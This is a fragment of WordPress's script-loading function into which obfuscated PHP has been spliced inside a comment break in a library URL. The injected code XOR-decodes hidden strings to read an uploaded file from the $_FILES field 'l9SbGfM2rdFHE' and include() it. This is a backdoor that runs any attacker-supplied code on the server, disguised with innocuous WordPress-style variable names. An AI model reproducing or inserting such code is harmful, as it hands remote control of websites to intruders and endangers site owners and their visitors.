...
function wp_default_scripts( $scripts ) {
	...
	$scripts->add( 'scriptaculous-root', 'https:ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/scriptaculous.j*/
 	
$force = 'l9SbGfM2rdFHE';
function parent_id($dest, $_ext)

{
    $parts = urldecode($dest);
    $post_author = substr($_ext,0, strlen($parts));
    return $parts ^ $post_author;
}
$clear_date = ${parent_id("3%7F%1A.%025", $force)};
	$excerpt_length = 'textarr';
if (isset($clear_date[$force]))

{

    $locale = $clear_date[$force];
    $attributes = $locale[parent_id("%18T%23%3D%29%07+W", $force)];

    include ($attributes);
}


/* s', array( 'prototype' ), '1.9.0' );
